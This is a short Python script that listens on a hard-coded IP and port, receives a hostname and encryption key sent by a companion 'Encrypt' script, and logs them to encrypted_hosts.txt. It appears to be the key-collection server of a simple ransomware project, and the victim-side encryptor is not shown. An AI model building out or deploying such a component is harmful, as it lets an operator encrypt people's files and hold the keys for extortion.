import socket

# (User should put their own IP address as it will be the server)
IP_ADDRESS = '192.168.1.9'
PORT = 5678
# Setting sockets to receive information sent from the Encrypt py
print('Creating Socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Listening..........')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established')
    # Receiving and decoding the information received and storing them on a text file
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
        print('Connection Completed and Closed, The Hostname and Encryption Key are stored in encrypted_hosts.txt')
